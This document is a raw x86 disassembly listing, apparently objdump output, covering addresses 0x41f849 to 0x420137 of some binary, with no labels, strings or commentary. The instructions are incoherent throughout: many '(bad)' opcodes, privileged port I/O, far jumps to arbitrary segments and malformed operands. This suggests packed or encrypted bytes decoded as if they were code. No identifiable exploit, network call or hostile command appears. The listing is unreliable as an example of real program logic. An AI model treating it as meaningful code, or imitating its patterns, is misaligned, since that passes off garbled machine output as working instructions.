  41f849:	ret    
  41f84a:	mov    ds:0xbdda6a45,eax
  41f84f:	fwait
  41f850:	call   0x79532faf
  41f855:	int3   
  41f856:	and    DWORD PTR [ecx-0x591eec4a],ecx
  41f85c:	inc    esi
  41f85d:	adc    edx,ecx
  41f85f:	push   esp
  41f860:	mov    bl,0xe8
  41f862:	fistp  DWORD PTR [esi+0x6d]
  41f865:	and    edx,DWORD PTR [esi-0x4b]
  41f868:	add    ecx,esp
  41f86a:	inc    ebx
  41f86b:	fwait
  41f86c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f86d:	data16 mov bl,BYTE PTR [eax-0x7aa8ba97]
  41f874:	and    BYTE PTR [ebx+0x4c454434],dl
  41f87a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f87b:	mov    DWORD PTR [edx+0x5c],esp
  41f87e:	inc    esp
  41f87f:	pop    ss
  41f880:	xor    DWORD PTR [ebp+0x25],esi
  41f883:	(bad)  
  41f884:	clc    
  41f885:	ret    
  41f886:	in     al,0x4
  41f888:	fsubp  st(1),st
  41f88a:	dec    esi
  41f88b:	jb     0x41f884
  41f88d:	mov    eax,ds:0x47fc4c9
  41f892:	dec    ecx
  41f893:	icebp  
  41f894:	xchg   ecx,eax
  41f895:	or     DWORD PTR [ecx+0x2d7e6a46],eax
  41f89b:	leave  
  41f89c:	leave  
  41f89d:	bound  ebp,QWORD PTR [edx+0x557ceb9c]
  41f8a3:	mov    eax,ds:0xf07b03ad
  41f8a8:	jo     0x41f82a
  41f8aa:	nop
  41f8ab:	aaa    
  41f8ac:	pusha  
  41f8ad:	sbb    al,0x55
  41f8af:	fnstcw WORD PTR [ebx]
  41f8b1:	dec    ebp
  41f8b2:	push   esp
  41f8b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8b5:	lea    edi,[edx]
  41f8b7:	push   ebp
  41f8b8:	scas   eax,DWORD PTR es:[edi]
  41f8b9:	mov    BYTE PTR [ecx-0x75],ch
  41f8bc:	enter  0x3d22,0xba
  41f8c0:	dec    ebp
  41f8c1:	sub    edx,DWORD PTR [ebx]
  41f8c3:	addr16 push ecx
  41f8c5:	test   BYTE PTR [edi],ah
  41f8c7:	inc    edx
  41f8c8:	fisttp DWORD PTR [esi]
  41f8ca:	jg     0x41f920
  41f8cc:	test   al,0x6b
  41f8ce:	xor    ebx,DWORD PTR [eax]
  41f8d0:	dec    edx
  41f8d1:	data16 mov dl,0xe8
  41f8d4:	and    bh,BYTE PTR [esi-0x37]
  41f8d7:	mov    edx,0x173b60a
  41f8dc:	dec    esp
  41f8dd:	add    BYTE PTR [eax+0x1304ae50],dl
  41f8e3:	stos   BYTE PTR es:[edi],al
  41f8e4:	or     eax,0x112757e6
  41f8e9:	stos   DWORD PTR es:[edi],eax
  41f8ea:	mov    DWORD PTR [eax],esp
  41f8ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8ed:	scas   eax,DWORD PTR es:[edi]
  41f8ee:	test   DWORD PTR [eax],eax
  41f8f0:	out    dx,eax
  41f8f1:	sbb    eax,0x47e3f1b5
  41f8f6:	out    dx,al
  41f8f7:	jae    0x41f92f
  41f8f9:	leave  
  41f8fa:	stos   BYTE PTR es:[edi],al
  41f8fb:	clc    
  41f8fc:	dec    edx
  41f8fd:	mov    al,0x80
  41f8ff:	xor    cl,dh
  41f901:	out    dx,al
  41f902:	and    BYTE PTR [edx-0x5d3bc7a9],ah
  41f908:	xchg   esp,eax
  41f909:	sbb    al,0xa9
  41f90b:	enter  0x26ed,0xe8
  41f90f:	addr16 inc edx
  41f911:	test   BYTE PTR [ecx-0x70],cl
  41f914:	mov    bl,0xc1
  41f916:	in     al,0x1f
  41f918:	mov    ch,0xb1
  41f91a:	sub    DWORD PTR [eax],ebx
  41f91c:	repnz push es
  41f91e:	stos   BYTE PTR es:[edi],al
  41f91f:	and    esi,DWORD PTR [esi]
  41f921:	and    bl,BYTE PTR [edx+0x7aeb24bc]
  41f927:	sti    
  41f928:	xchg   BYTE PTR [edi],dl
  41f92a:	arpl   WORD PTR [ebx-0x5b],di
  41f92d:	jl     0x41f923
  41f92f:	xchg   esi,eax
  41f930:	in     eax,0x4c
  41f932:	ins    DWORD PTR es:[edi],dx
  41f933:	js     0x41f902
  41f935:	mov    bh,0x6b
  41f937:	fild   WORD PTR [esi+ebx*8-0x5d]
  41f93b:	cmp    al,0x50
  41f93d:	mov    ebx,0x7dea7c08
  41f942:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f943:	sub    BYTE PTR [edx+edx*8],cl
  41f946:	pop    esi
  41f947:	sbb    ch,BYTE PTR [ecx+edx*8+0x2f]
  41f94b:	pop    esi
  41f94c:	aad    0x72
  41f94e:	ja     0x167f8718
  41f954:	jno    0x41f9ca
  41f956:	add    eax,0x13a18a63
  41f95b:	inc    ebp
  41f95c:	aam    0x9e
  41f95e:	mov    ds:0xa3d467d5,al
  41f963:	(bad)  
  41f965:	out    0x97,eax
  41f967:	mov    ch,0x7a
  41f969:	and    BYTE PTR [edi],bl
  41f96b:	aaa    
  41f96c:	dec    ecx
  41f96d:	xor    ch,BYTE PTR [edx-0x7d]
  41f970:	pushf  
  41f971:	daa    
  41f972:	mov    eax,ds:0xa83588c3
  41f977:	fwait
  41f978:	dec    edi
  41f979:	and    DWORD PTR [eax+0x33060633],eax
  41f97f:	ins    BYTE PTR es:[edi],dx
  41f980:	xchg   ecx,eax
  41f981:	inc    edi
  41f982:	ins    BYTE PTR es:[edi],dx
  41f983:	lods   eax,DWORD PTR ds:[esi]
  41f984:	adc    al,0xd
  41f986:	sub    BYTE PTR [esp+ebp*1],al
  41f989:	pop    edx
  41f98a:	sbb    eax,DWORD PTR [eax-0xe]
  41f98d:	add    cl,dl
  41f98f:	jno    0x41f9f9
  41f991:	xchg   edi,eax
  41f992:	scas   al,BYTE PTR es:[edi]
  41f993:	xor    edx,DWORD PTR [ecx-0x3]
  41f996:	jle    0x41f973
  41f998:	adc    al,0x57
  41f99a:	scas   al,BYTE PTR es:[edi]
  41f99b:	aaa    
  41f99c:	jno    0x41f9b2
  41f99e:	popa   
  41f99f:	hlt    
  41f9a0:	adc    eax,0x7cbec4f
  41f9a5:	or     eax,0xe8de96a1
  41f9aa:	jae    0x41f950
  41f9ac:	jno    0x41f9b9
  41f9ae:	pop    ebp
  41f9af:	push   esp
  41f9b0:	bswap  esi
  41f9b2:	jnp    0x41f940
  41f9b4:	sub    al,0x86
  41f9b6:	int3   
  41f9b7:	shl    BYTE PTR [edx],1
  41f9b9:	or     cl,al
  41f9bb:	or     al,BYTE PTR [ecx+0x7970562a]
  41f9c1:	inc    ecx
  41f9c2:	inc    ecx
  41f9c3:	in     al,dx
  41f9c4:	xchg   esi,eax
  41f9c5:	aas    
  41f9c6:	imul   edi,DWORD PTR [ebx+0x57],0xffffff99
  41f9ca:	shl    DWORD PTR [edi+ebp*1],0x1
  41f9ce:	mov    cl,0xc8
  41f9d0:	cld    
  41f9d1:	lock aaa 
  41f9d3:	inc    esi
  41f9d4:	adc    BYTE PTR [ecx],dl
  41f9d6:	sti    
  41f9d7:	lock cmc 
  41f9d9:	repz adc cl,al
  41f9dc:	scas   eax,DWORD PTR es:[edi]
  41f9dd:	(bad)  
  41f9de:	xchg   esp,eax
  41f9df:	jmp    0xfddf48ba
  41f9e4:	adc    esi,ecx
  41f9e6:	xor    eax,eax
  41f9e8:	jg     0x41f9a5
  41f9ea:	dec    esi
  41f9eb:	inc    ebp
  41f9ec:	fmul   DWORD PTR [eax-0x3a]
  41f9ef:	xor    esi,DWORD PTR [eax+0x1d92bf4d]
  41f9f5:	ficom  WORD PTR [esi-0x5]
  41f9f8:	es or  edi,eax
  41f9fb:	sub    DWORD PTR [edi+0x76d44d9e],esi
  41fa01:	inc    esi
  41fa02:	addr16 sbb eax,0xa3edd1bb
  41fa08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa09:	aaa    
  41fa0a:	out    dx,eax
  41fa0b:	sub    al,0x7a
  41fa0d:	fsubr  QWORD PTR [ebx-0x3eeaeabf]
  41fa13:	add    ebp,ecx
  41fa15:	sub    BYTE PTR [ebx],dl
  41fa17:	pusha  
  41fa18:	test   BYTE PTR [esi-0x77],bh
  41fa1b:	sbb    esp,DWORD PTR [esi]
  41fa1d:	test   BYTE PTR [esi-0x304b92a7],0x49
  41fa24:	mov    ah,0xbd
  41fa26:	into   
  41fa27:	and    dh,0x18
  41fa2a:	(bad)  
  41fa2b:	leave  
  41fa2c:	xchg   esi,eax
  41fa2d:	loopne 0x41fa62
  41fa2f:	xor    eax,0xe8037687
  41fa34:	mov    edi,0xc1b11475
  41fa39:	cwde   
  41fa3a:	out    0x4e,eax
  41fa3c:	push   ds
  41fa3d:	in     eax,dx
  41fa3e:	push   esi
  41fa3f:	push   eax
  41fa40:	in     al,0xf
  41fa42:	pop    ebp
  41fa43:	nop
  41fa44:	sbb    DWORD PTR [edx-0x7a51c3ff],edi
  41fa4a:	lea    ebx,[ebx]
  41fa4c:	addr16 jbe 0x41fa22
  41fa4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa50:	jmp    0x4b73:0x16cf0eeb
  41fa57:	pop    esi
  41fa58:	pop    ebp
  41fa59:	enter  0x4000,0x43
  41fa5d:	aad    0x1d
  41fa5f:	lahf   
  41fa60:	cmp    al,0x7e
  41fa62:	cli    
  41fa63:	(bad)  
  41fa65:	jg     0x41fa95
  41fa67:	out    0x87,eax
  41fa69:	mov    esp,0xe3b26515
  41fa6e:	imul   esp,DWORD PTR [edx+0x4c22f7cc],0x43cccf91
  41fa78:	cmc    
  41fa79:	cdq    
  41fa7a:	test   eax,0x90e0b40b
  41fa7f:	enter  0x1ccb,0x3d
  41fa83:	mov    al,0x97
  41fa85:	pop    esi
  41fa86:	mov    eax,0x412024c
  41fa8b:	jns    0x41fab9
  41fa8d:	outs   dx,DWORD PTR ds:[esi]
  41fa8e:	mov    ebx,ebx
  41fa90:	inc    ebx
  41fa91:	sbb    eax,0x60b885fc
  41fa96:	xchg   edi,eax
  41fa97:	mov    ecx,0x53eb5f4d
  41fa9c:	pop    ebx
  41fa9d:	xor    al,0x1c
  41fa9f:	lock mov DWORD PTR [ebp+0x214132d9],ebx
  41faa6:	fidiv  WORD PTR [edx+0x54]
  41faa9:	fisttp QWORD PTR [ecx]
  41faab:	cmp    ebx,DWORD PTR ds:0xea700613
  41fab1:	adc    eax,0x295663bf
  41fab6:	loopne 0x41facf
  41fab8:	sbb    eax,0xda80a2c3
  41fabd:	jb     0x41fa66
  41fabf:	mov    ecx,0x2890ea87
  41fac4:	mov    cl,0xf1
  41fac6:	jmp    0xde157520
  41facb:	mov    eax,ds:0x79aa7452
  41fad0:	test   al,0x90
  41fad2:	pop    esi
  41fad3:	add    DWORD PTR [ebx+0x6e],esp
  41fad6:	repz jecxz 0x41fa73
  41fad9:	or     DWORD PTR [edx+esi*4-0x22d214ca],ebx
  41fae0:	pop    ecx
  41fae1:	stc    
  41fae2:	mov    ch,BYTE PTR [edi+edx*2]
  41fae5:	jo     0x41fb61
  41fae7:	xchg   BYTE PTR [eax+0x23de60b0],dh
  41faed:	adc    al,0x67
  41faef:	shl    BYTE PTR [esp+ecx*8-0x22664536],0x8e
  41faf7:	stos   DWORD PTR es:[edi],eax
  41faf8:	arpl   WORD PTR [eax+0x5cba4b1b],bx
  41fafe:	sbb    al,0x2a
  41fb00:	and    al,0x52
  41fb02:	mov    ds:0x4bcb7a91,eax
  41fb07:	dec    edx
  41fb08:	and    eax,0xe1ca9a05
  41fb0d:	mov    dl,0xcf
  41fb0f:	jmp    0x5e62:0x45303a03
  41fb16:	sbb    al,BYTE PTR [ebx-0x53a3dec3]
  41fb1c:	inc    eax
  41fb1d:	jge    0x41fb1d
  41fb1f:	call   0xa4f210f4
  41fb24:	jg     0x41fb6c
  41fb26:	push   0xffffff90
  41fb28:	fsub   QWORD PTR [edx]
  41fb2a:	push   eax
  41fb2b:	dec    edx
  41fb2c:	cmp    dl,BYTE PTR ss:[ecx-0x2b]
  41fb30:	fisub  DWORD PTR [ebp+0x13]
  41fb33:	(bad)  
  41fb34:	scas   eax,DWORD PTR es:[edi]
  41fb35:	xor    eax,0x9b384f4
  41fb3a:	push   esp
  41fb3b:	(bad)  
  41fb3c:	xchg   al,bl
  41fb3e:	shl    WORD PTR [edx+0x37eaa06f],0x93
  41fb46:	in     al,dx
  41fb47:	mov    gs,WORD PTR [ecx]
  41fb49:	cli    
  41fb4a:	jne    0x41faf8
  41fb4c:	lock iret 
  41fb4e:	std    
  41fb4f:	mov    al,0x1a
  41fb51:	outs   dx,BYTE PTR ds:[esi]
  41fb52:	ret    
  41fb53:	icebp  
  41fb54:	rol    ebx,cl
  41fb56:	inc    esi
  41fb57:	ror    BYTE PTR [eax+edi*2-0x67],cl
  41fb5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb5c:	mov    ah,0xc
  41fb5e:	jmp    0xe941:0xd43bf6f0
  41fb65:	jp     0x41fb55
  41fb67:	jg     0x41fb7c
  41fb69:	lahf   
  41fb6a:	fcom   QWORD PTR [esi]
  41fb6c:	pop    ebx
  41fb6d:	ja     0x41fbbc
  41fb6f:	into   
  41fb70:	std    
  41fb71:	jmp    0x6870:0x6b4fccae
  41fb78:	stos   DWORD PTR es:[edi],eax
  41fb79:	leave  
  41fb7a:	push   edx
  41fb7b:	test   eax,0x930dbd27
  41fb80:	pusha  
  41fb81:	push   edx
  41fb82:	sti    
  41fb83:	xor    eax,0x16f41270
  41fb88:	cmp    BYTE PTR [edi],dh
  41fb8a:	sub    eax,0xd8b0eac4
  41fb8f:	leave  
  41fb90:	cmp    BYTE PTR [eax+0x41259a6a],al
  41fb96:	jg     0x41fbc1
  41fb98:	jns    0x41fbee
  41fb9a:	in     eax,dx
  41fb9b:	dec    esi
  41fb9c:	mov    ds:0x2f4ffc1b,al
  41fba1:	ins    BYTE PTR es:[edi],dx
  41fba2:	sbb    eax,0x114b4c5a
  41fba7:	push   esi
  41fba8:	and    eax,0x74b5b4b
  41fbad:	shl    BYTE PTR fs:[edi+0xf],0x35
  41fbb2:	xor    eax,0x5a302133
  41fbb7:	(bad)  
  41fbb8:	scas   eax,DWORD PTR es:[edi]
  41fbb9:	inc    esp
  41fbba:	arpl   WORD PTR ss:[ecx],si
  41fbbd:	push   eax
  41fbbe:	rcr    DWORD PTR [ebx+0x19a0ae2f],cl
  41fbc4:	addr16 push es
  41fbc6:	rol    DWORD PTR [ecx],1
  41fbc8:	jge    0x41fb91
  41fbca:	rcl    BYTE PTR [ecx+0xb06489e],0x24
  41fbd1:	scas   eax,DWORD PTR es:[edi]
  41fbd2:	push   0xf7429e7b
  41fbd7:	cmc    
  41fbd8:	fsubr  QWORD PTR [esi-0x1f]
  41fbdb:	and    dh,BYTE PTR [ecx-0x3c]
  41fbde:	pop    edx
  41fbdf:	or     BYTE PTR [ebp-0x61039781],0x2a
  41fbe6:	cmp    DWORD PTR [edi],ebp
  41fbe8:	pop    edi
  41fbe9:	arpl   WORD PTR [eax+eax*4-0x46f1b312],bx
  41fbf0:	mov    fs,WORD PTR [esi]
  41fbf2:	jbe    0x41fb91
  41fbf4:	fs retf 0xef3b
  41fbf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbf9:	mov    ecx,0xe8164acf
  41fbfe:	dec    eax
  41fbff:	sbb    DWORD PTR [edi+0x51a82d4f],eax
  41fc05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc06:	ins    BYTE PTR es:[edi],dx
  41fc07:	jmp    DWORD PTR [edx+0x6]
  41fc0a:	xchg   BYTE PTR ds:0x28aaf128,dh
  41fc10:	add    al,0xc8
  41fc12:	retf   0xdd8f
  41fc15:	in     eax,0x92
  41fc17:	mov    ebp,0xc6220b14
  41fc1c:	push   ss
  41fc1d:	es pushf 
  41fc1f:	bnd jo 0x41fc7b
  41fc22:	sahf   
  41fc23:	mov    WORD PTR [ebp+ecx*2+0x68c95f78],fs
  41fc2a:	mov    ebp,DWORD PTR [ebx+0x55]
  41fc2d:	jnp    0x41fc29
  41fc2f:	inc    esp
  41fc30:	sub    DWORD PTR [edi+0x50df3aef],0x5dc5cea1
  41fc3a:	and    al,0xaf
  41fc3c:	sahf   
  41fc3d:	adc    eax,0x1694b0d7
  41fc42:	pushf  
  41fc43:	cld    
  41fc44:	int3   
  41fc45:	fsub   st,st(6)
  41fc47:	adc    ax,dx
  41fc4a:	push   es
  41fc4b:	scas   al,BYTE PTR es:[edi]
  41fc4c:	xlat   BYTE PTR ds:[ebx]
  41fc4d:	sbb    DWORD PTR [ebx+0x394b86f9],ebp
  41fc53:	push   cs
  41fc54:	ins    DWORD PTR es:[edi],dx
  41fc55:	test   eax,0x331f0941
  41fc5a:	retf   0x46ec
  41fc5d:	xchg   ebp,eax
  41fc5e:	jecxz  0x41fc5b
  41fc60:	lahf   
  41fc61:	and    ebx,DWORD PTR [ecx-0x10]
  41fc64:	not    edx
  41fc66:	xchg   esp,eax
  41fc67:	jne    0x41fc18
  41fc69:	and    DWORD PTR [eax+0x43494e20],edx
  41fc6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc70:	cmp    BYTE PTR [edi],0x44
  41fc73:	cmp    eax,0xceb63bcb
  41fc78:	lds    ebx,FWORD PTR [ebx]
  41fc7a:	rol    ch,0x8e
  41fc7d:	jne    0x41fc45
  41fc7f:	adc    eax,0x1a91aac
  41fc84:	into   
  41fc85:	xor    DWORD PTR [esp+eiz*4+0x7b0795dd],esi
  41fc8c:	ja     0x41fce1
  41fc8e:	or     DWORD PTR [edx+0x71edf96d],eax
  41fc94:	jns    0x41fcbb
  41fc96:	jb     0x41fc84
  41fc98:	mov    ebp,0x937ccce4
  41fc9d:	pop    ebx
  41fc9e:	ret    0xd374
  41fca1:	sub    eax,0xef1b
	...
  41fe72:	add    BYTE PTR [eax],al
  41fe74:	mov    ?,WORD PTR [ebp-0x1b]
  41fe77:	in     al,dx
  41fe78:	idiv   esp
  41fe7a:	(bad)  
  41fe7b:	jg     0x41feef
  41fe7d:	and    eax,0xa45e1474
  41fe82:	add    BYTE PTR [esi-0x3f],dl
  41fe85:	lds    eax,FWORD PTR [ecx]
  41fe87:	add    BYTE PTR [edx],ah
  41fe89:	pop    es
  41fe8a:	add    BYTE PTR [eax],al
  41fe8c:	mov    ?,WORD PTR [ebp+0x53]
  41fe8f:	mov    ds:0x6bffc182,eax
  41fe94:	push   es
  41fe95:	dec    esi
  41fe96:	mov    dl,0x14
  41fe98:	repz popf 
  41fe9a:	adc    ecx,0x540fafc2
  41fea0:	(bad)  
  41fea1:	hlt    
  41fea2:	and    esi,eax
  41fea4:	enter  0xdb4a,0x7e
  41fea8:	cli    
  41fea9:	mov    esp,0x89411a70
  41feae:	pop    edi
  41feaf:	out    0x4d,al
  41feb1:	add    BYTE PTR [edx+0x3a63ce3b],dl
  41feb7:	inc    ebp
  41feb8:	scas   al,BYTE PTR es:[edi]
  41feb9:	in     al,0xb2
  41febb:	mov    ds,WORD PTR [ebx+ebp*1+0x61]
  41febf:	mov    edi,gs
  41fec1:	(bad)  
  41fec2:	(bad)  
  41fec3:	mov    ebp,0xedaefb96
  41fec8:	dec    esp
  41fec9:	cmp    DWORD PTR [esi],ebp
  41fecb:	and    eax,0x16258608
  41fed0:	sbb    eax,0x97e827cf
  41fed5:	adc    eax,0xc0ed9dd3
  41feda:	jge    0x41ff17
  41fedc:	dec    esp
  41fedd:	ins    BYTE PTR es:[edi],dx
  41fede:	enter  0x3d33,0x7f
  41fee2:	or     eax,0xabb4ce2f
  41fee7:	stos   DWORD PTR es:[edi],eax
  41fee8:	fnstsw WORD PTR [edx+0x10dd7ff5]
  41feee:	in     eax,dx
  41feef:	cli    
  41fef0:	fld    st(0)
  41fef2:	jno    0x41fef0
  41fef4:	scas   eax,DWORD PTR es:[edi]
  41fef5:	adc    ch,BYTE PTR [edx]
  41fef7:	scas   eax,DWORD PTR es:[edi]
  41fef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fef9:	inc    eax
  41fefa:	(bad)  
  41fefb:	mov    ecx,0xf4d933f4
  41ff00:	mov    dl,0xdf
  41ff02:	int3   
  41ff03:	or     edx,DWORD PTR [ebp+ebx*1+0x3]
  41ff07:	mov    ebp,0xcaa890e3
  41ff0c:	jb     0x41ff71
  41ff0e:	sbb    BYTE PTR [edx+0x3e0c1d53],bh
  41ff14:	lahf   
  41ff15:	push   es
  41ff16:	push   edx
  41ff17:	mov    fs,ebp
  41ff19:	out    dx,al
  41ff1a:	jmp    0x7851:0x3eed76f4
  41ff21:	clc    
  41ff22:	(bad)  
  41ff23:	das    
  41ff24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff25:	pop    ebp
  41ff26:	sbb    esp,edx
  41ff28:	aaa    
  41ff29:	repnz pop ecx
  41ff2b:	add    BYTE PTR [eax+0x42],dh
  41ff2e:	dec    esp
  41ff2f:	mov    al,0xbe
  41ff31:	mov    al,0x52
  41ff33:	inc    edi
  41ff34:	(bad)  
  41ff35:	stc    
  41ff36:	inc    ecx
  41ff37:	ins    BYTE PTR es:[edi],dx
  41ff38:	mov    BYTE PTR ss:[ecx+ecx*1-0x32],al
  41ff3d:	fsubp  st(2),st
  41ff3f:	in     al,0x81
  41ff41:	iret   
  41ff42:	das    
  41ff43:	into   
  41ff44:	jae    0x41ff77
  41ff46:	sbb    BYTE PTR ds:0x1f306806,dl
  41ff4c:	push   ss
  41ff4d:	mov    cl,0x75
  41ff4f:	sub    eax,0xd062612d
  41ff54:	sbb    DWORD PTR [esi],edi
  41ff56:	push   esp
  41ff57:	dec    esp
  41ff58:	adc    cl,cl
  41ff5a:	scas   eax,DWORD PTR es:[edi]
  41ff5b:	xchg   DWORD PTR [edx+0x78468f5d],edi
  41ff61:	jp     0x41ffcd
  41ff63:	cld    
  41ff64:	ror    bh,cl
  41ff66:	dec    ecx
  41ff67:	mov    esi,0xb432ea56
  41ff6c:	sub    ch,BYTE PTR [esi+0x56]
  41ff6f:	cmc    
  41ff70:	fsubr  DWORD PTR [edi]
  41ff72:	icebp  
  41ff73:	jl     0x41ffd8
  41ff75:	cmp    esi,DWORD PTR [ebx]
  41ff77:	sub    bl,cl
  41ff79:	lahf   
  41ff7a:	test   al,0x6
  41ff7c:	pop    ss
  41ff7d:	cmc    
  41ff7e:	fidivr DWORD PTR [esi-0x4e]
  41ff81:	repz push ss
  41ff83:	add    BYTE PTR [ecx+0x29],ch
  41ff86:	sbb    ebp,edi
  41ff88:	xchg   esi,eax
  41ff89:	xchg   edi,eax
  41ff8a:	sub    ebx,DWORD PTR [esi-0x77]
  41ff8d:	out    dx,al
  41ff8e:	xor    al,BYTE PTR [ecx]
  41ff90:	arpl   bp,di
  41ff92:	xchg   esi,eax
  41ff93:	xchg   ebp,eax
  41ff94:	adc    al,0x64
  41ff96:	add    al,BYTE PTR cs:[edx+0x3bd27f02]
  41ff9d:	lea    ebx,[edx-0x32fa7ae8]
  41ffa3:	pop    esp
  41ffa4:	pop    es
  41ffa5:	outs   dx,BYTE PTR ds:[esi]
  41ffa6:	test   DWORD PTR [edx],ecx
  41ffa8:	pop    edi
  41ffa9:	dec    ebp
  41ffaa:	nop
  41ffab:	cli    
  41ffac:	in     eax,0x40
  41ffae:	call   0x8b12:0xafbfcb77
  41ffb5:	mov    ah,0xdb
  41ffb7:	fwait
  41ffb8:	pop    edx
  41ffb9:	test   ecx,0x668b7bb0
  41ffbf:	out    0xc3,eax
  41ffc1:	cld    
  41ffc2:	icebp  
  41ffc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffc4:	mov    ebp,es
  41ffc6:	nop
  41ffc7:	adc    al,0xe1
  41ffc9:	push   cs
  41ffca:	repnz mov ds:0x5693942c,al
  41ffd0:	mov    esp,DWORD PTR [ecx+0x45]
  41ffd3:	fs mov ebx,0x4208db9b
  41ffd9:	mov    cl,BYTE PTR [esi+0xd]
  41ffdc:	and    eax,0xaacbf7b9
  41ffe1:	or     DWORD PTR [esi-0x4aa3bf04],0xfffffffe
  41ffe8:	fild   WORD PTR [eax]
  41ffea:	fwait
  41ffeb:	retf   0x385d
  41ffee:	sub    eax,0x1b6043bb
  41fff3:	mov    esp,0x4a649818
  41fff8:	inc    eax
  41fff9:	sbb    eax,0x840f6e71
  41fffe:	fbstp  TBYTE PTR [eax]
  420000:	repnz mov DWORD PTR [eax-0x2de8d6d0],edi
  420007:	push   ss
  420008:	sub    bl,BYTE PTR [edx-0x6f3f26d7]
  42000e:	daa    
  42000f:	sub    BYTE PTR [esi],dl
  420011:	xchg   DWORD PTR [ebx-0x3df2fa4f],ecx
  420017:	arpl   cx,bx
  420019:	dec    eax
  42001a:	jmp    0x41ffea
  42001c:	sar    edi,cl
  42001e:	sbb    ch,dh
  420020:	pop    edi
  420021:	imul   edi,DWORD PTR [esi-0x6291b431],0x32
  420028:	lahf   
  420029:	popa   
  42002a:	outs   dx,BYTE PTR ds:[esi]
  42002b:	ds ja  0x4200a4
  42002e:	xchg   edx,eax
  42002f:	outs   dx,DWORD PTR ds:[esi]
  420030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420031:	cwde   
  420032:	stos   DWORD PTR es:[edi],eax
  420033:	inc    eax
  420034:	in     eax,0xa0
  420036:	or     al,0xa2
  420038:	add    edx,DWORD PTR [ebp-0x9]
  42003b:	dec    edi
  42003c:	in     eax,0xd1
  42003e:	jno    0x420086
  420040:	dec    edx
  420041:	push   eax
  420042:	add    edx,DWORD PTR [esi]
  420044:	inc    ecx
  420045:	fisubr DWORD PTR [ecx+0x7c]
  420048:	out    dx,eax
  420049:	mov    ds:0xcbb0622e,al
  42004e:	jp     0x42008f
  420050:	sbb    al,0x99
  420052:	jae    0x41ffd5
  420054:	in     eax,dx
  420055:	sub    DWORD PTR [ecx+edx*2],ebp
  420058:	inc    edx
  420059:	cmc    
  42005a:	xlat   BYTE PTR ds:[ebx]
  42005b:	fild   WORD PTR ds:0x1a5b9495
  420061:	sar    ch,cl
  420063:	neg    DWORD PTR [eax]
  420065:	bound  edx,QWORD PTR [edx-0x70b2be64]
  42006b:	adc    al,0xd8
  42006d:	repnz fsub st,st(0)
  420070:	cmp    eax,ebx
  420072:	xor    BYTE PTR [edi+0x6e7e61b4],0xeb
  420079:	fadd   st(5),st
  42007b:	xchg   edx,eax
  42007c:	pop    eax
  42007d:	jmp    0x4ade6649
  420082:	or     BYTE PTR [ebx+0x3d],0x4e
  420086:	sub    DWORD PTR [eax+0x7f6d354f],ebp
  42008c:	rcr    DWORD PTR [esi-0x348f2867],0x23
  420093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420094:	lock xchg ebx,eax
  420096:	repnz push ebx
  420098:	bound  esp,QWORD PTR [esi]
  42009a:	outs   dx,BYTE PTR ds:[esi]
  42009b:	mov    ch,0x8f
  42009d:	jne    0x4200aa
  42009f:	add    BYTE PTR [ebx],ah
  4200a1:	arpl   cx,si
  4200a3:	popf   
  4200a4:	mov    esi,0x8edd64c6
  4200a9:	jmp    0x420099
  4200ab:	dec    ebx
  4200ac:	cmp    DWORD PTR [ecx+0x5f],0x24
  4200b0:	mov    esi,0x38b2677c
  4200b5:	adc    esp,esp
  4200b7:	dec    eax
  4200b8:	ja     0x4200b7
  4200ba:	xchg   esp,eax
  4200bb:	(bad)  
  4200bc:	mov    al,ds:0xb041d85f
  4200c1:	push   es
  4200c2:	test   BYTE PTR [ecx],ah
  4200c4:	cdq    
  4200c5:	aaa    
  4200c6:	push   eax
  4200c7:	dec    esp
  4200c8:	mov    es,WORD PTR [eax]
  4200ca:	xor    BYTE PTR [ecx],0xf6
  4200cd:	sbb    al,BYTE PTR [eax]
  4200cf:	sti    
  4200d0:	(bad)  
  4200d1:	aam    0xa4
  4200d3:	xchg   esi,eax
  4200d4:	push   esi
  4200d5:	das    
  4200d6:	push   ecx
  4200d7:	inc    ebx
  4200d8:	mov    al,0x8b
  4200da:	daa    
  4200db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200dc:	xor    ebp,DWORD PTR [edx]
  4200de:	arpl   WORD PTR [esi-0x3b08f9bb],si
  4200e4:	push   cs
  4200e5:	dec    ebx
  4200e6:	sahf   
  4200e7:	aas    
  4200e8:	aaa    
  4200e9:	jmp    0x420117
  4200eb:	sti    
  4200ec:	ins    DWORD PTR es:[edi],dx
  4200ed:	jecxz  0x42009e
  4200ef:	sar    BYTE PTR [ecx+0x1],1
  4200f2:	daa    
  4200f3:	add    eax,0x1491890a
  4200f8:	in     eax,0xf4
  4200fa:	sub    ebp,DWORD PTR [ecx+edi*4-0x29f9a4fb]
  420101:	and    eax,0xcb3e8cfe
  420106:	lods   eax,DWORD PTR ds:[esi]
  420107:	pop    eax
  420108:	jmp    0xe75848a1
  42010d:	xchg   edx,eax
  42010e:	xor    eax,esi
  420110:	jecxz  0x42012c
  420112:	and    bl,BYTE PTR [eax]
  420114:	jl     0x4200b9
  420116:	jnp    0x42009a
  420118:	dec    esi
  420119:	leave  
  42011a:	ret    
  42011b:	cmp    eax,0xe7f24fbd
  420120:	int    0xae
  420122:	xchg   ebx,eax
  420123:	(bad)  
  420125:	fisttp QWORD PTR [esi+0x4da84348]
  42012b:	pop    ss
  42012c:	jbe    0x420122
  42012e:	cld    
  42012f:	in     eax,dx
  420130:	shr    BYTE PTR [edx-0x6404cdb6],cl
  420136:	das    
  420137:	push   ss
